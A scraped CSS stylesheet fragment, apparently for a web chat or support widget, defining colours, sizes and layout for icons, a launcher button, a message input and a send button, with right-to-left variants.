.Icon--preview-presentation-30FzT path { fill: rgb(255, 182, 72); }

.Icon--preview-spreadsheet-1JXEo path { fill: rgb(0, 166, 86); }

.Icon--preview-document-3bimD path { fill: rgb(48, 145, 236); }

.Icon--preview-image-2l_dE path { fill: rgb(2, 161, 145); }

.Icon--preview-zip-1kcdM path { fill: rgb(3, 54, 61); }

.Icon--preview-error-3Pro9 path { fill: rgb(216, 220, 222); }

.Icon--error-fill-3KE5L path { fill: rgb(217, 63, 76); }

.Icon--checkmark-fill-1hJqY path { fill: rgb(34, 143, 103); }

.Icon--checkmark-fill-1hJqY svg { min-width: 1.07143rem; min-height: 1.07143rem; height: 1.07143rem; width: 1.07143rem; }

.Icon--remove-1HWzz path { fill: rgb(135, 146, 157); }

.Icon--trash-fill-3VNs_ svg { min-width: 1.07143rem; min-height: 1.07143rem; max-height: 1.07143rem; max-width: 1.07143rem; height: 1.07143rem; width: 1.07143rem; }

.Icon--success-contactForm-2fNl8 svg { min-width: 11.4286rem; width: 11.4286rem; height: 5.71429rem; }

.Icon--clock-stroke-bGqp3 svg { color: rgb(104, 115, 125); min-width: 1.07143rem; min-height: 1.07143rem; height: 1.07143rem; width: 1.07143rem; }

.Icon--clock-stroke-bGqp3 svg path { fill: rgb(194, 200, 204); }

.Icon--agent-avatar-4Ix95 svg rect { fill: rgb(135, 146, 157); }

.wrapper-AtBcr { color: rgb(255, 255, 255); fill: rgb(255, 255, 255); padding: 0.92857rem 1.57143rem; border-radius: 999rem; bottom: 0px; letter-spacing: 0.6px; font-size: 1.07143rem; }

.wrapper-AtBcr:focus { outline: none; box-shadow: rgba(255, 255, 255, 0.4) 0px 0px 0px 0.21429rem inset; }

.wrapperMobile-1Ets2 { padding: 1rem; }

.icon-3E9qF { padding-right: 0.57143rem; }

[dir="rtl"] .icon-3E9qF { padding-left: 0.57143rem; padding-right: 0px; }

.iconMobile-1KJit { }

.label-3kk12 { }

.labelMobile-1CefB { }

.container-1-ZOL { border-radius: 0.57143rem; height: 14.2857rem; width: 17.5rem; box-shadow: rgba(0, 0, 0, 0.2) 0px 0px 0.42857rem 0px; margin-right: 0.42857rem; margin-top: 0.42857rem; }

.containerForWidget-2jSmS { margin: 0px; position: fixed; bottom: 5px; left: 50%; top: 50%; transform: translateX(-50%) translateY(-50%); }

.textContainer-33aq2 { vertical-align: middle; overflow-wrap: break-word; text-overflow: ellipsis; font-size: 1.14286rem; font-family: Verdana, Geneva, sans-serif; padding: 0.71429rem 0px; overflow: hidden !important; }

.textOnLeft-3Yi2D { padding-right: 0.21429rem; padding-left: 0.71429rem; }

.textOnRight-2xcGt { padding-left: 0.28571rem; padding-right: 0.42857rem; }

.textOnly-f_fzj { font-size: 1.42857rem !important; text-align: center !important; }

.imageContainer-1MRiB { vertical-align: middle; text-align: center; width: 7.14286rem; }

.splashDisplayContainer-22i6A { background-color: rgb(73, 84, 92); border-radius: 0.57143rem 0.57143rem 0px 0px; border: 0px; padding: 0px; overflow: hidden; position: relative; height: 11.4286rem; }

.splashPadding-HegMF { padding: 1.42857rem 0.71429rem 0.71429rem; }

.splashTable-168XT { width: 100%; height: 100%; table-layout: fixed; direction: ltr; margin-top: 8px; }

.title-1G91k { z-index: 1; position: absolute; top: 0.21429rem; width: 80%; text-align: center; font-family: Verdana, Geneva, sans-serif; line-height: 1em; height: 1.42857rem !important; padding-top: 0.64286rem !important; font-size: 0.71429rem !important; }

.chatIcon-3zWxB { width: 5.35714rem; height: 3.85714rem; }

.chatIcon-3zWxB svg path[class="cls-1"] { fill: rgb(255, 255, 255); }

.inputContainer-3UJOk { height: 2.85714rem; border-bottom-left-radius: 0.57143rem; border-bottom-right-radius: 0.57143rem; display: flex; }

.inputContainer-3UJOk > div:first-child { height: 2.85714rem; flex: 1 1 0%; }

.input-3kko7 { color: rgb(73, 84, 92); display: inline-block; vertical-align: top; padding: 0px 0.57143rem; letter-spacing: -0.01071rem; font-family: Verdana, Geneva, sans-serif; border-radius: 0px; min-height: 2.85714rem; }

.input-3kko7:not(:focus) { border: none; }

.input-3kko7::placeholder { color: rgb(135, 146, 157); }

[dir="ltr"] .input-3kko7 { border-bottom-left-radius: 0.57143rem; }

[dir="rtl"] .input-3kko7 { border-bottom-right-radius: 0.57143rem; }

.sendButton-1Dqkv { background-color: rgb(255, 255, 255); display: inline-flex; justify-content: center; align-items: center; height: 2.85714rem; width: 2.85714rem; border-top-left-radius: 0px; border-top-right-radius: 0px; }

[dir="ltr"] .sendButton-1Dqkv { border-bottom-right-radius: 0.57143rem; border-bottom-left-radius: 0px; }

[dir="rtl"] .sendButton-1Dqkv { border-bottom-left-radius: 0.57143rem; border-bottom-right-radius: 0px; }

[dir="rtl"] .sendButton-1Dqkv svg { transform: scale(-1); }

.sendButton-1Dqkv svg { fill: rgb(194, 200, 204) !important; }

.sendButton-1Dqkv svg path { fill: rgb(194, 200, 204) !important; }

.sendButtonActive-2YYTD svg { fill: rgb(104, 115, 125) !important; }

.sendButtonActive-2YYTD svg path { fill: rgb(104, 115, 125) !important; }

.minimizeButton-31FRu { position: absolute; top: 0.71429rem; height: 1.42857rem; width: 1.5rem; }

[dir="ltr"] .minimizeButton-31FRu { right: 0.42857rem; }

[dir="rtl"] .minimizeButton-31FRu { left: 0.42857rem; }

.customImg-17c3D { max-height: 7.14286rem; max-width: 7.14286rem; }

.customImgOnly-SSXCp { width: 17.5rem; border-top-left-radius: 0.57143rem; border-top-right-radius: 0.57143rem; }

.imgOnly-10Jfr { padding-left: 0.57143rem; margin-top: 1.71429rem; }

.imgRight-35TUF { margin-left: 0.35714rem; }

.imgLeft-2BeQ0 { margin-right: 0.35714rem; }

.u-userLauncherColor:not([disabled]) { background-color: rgb(52, 56, 84) !important; color: rgb(255, 255, 255) !important; fill: rgb(255, 255, 255) !important; }

.u-userLauncherColor:not([disabled]) svg { color: rgb(255, 255, 255); fill: rgb(255, 255, 255); }

.u-userLauncherColor:not([disabled]) svg path { fill: rgb(255, 255, 255); }


html { font-size: 14.0233px; }
</style></body></html>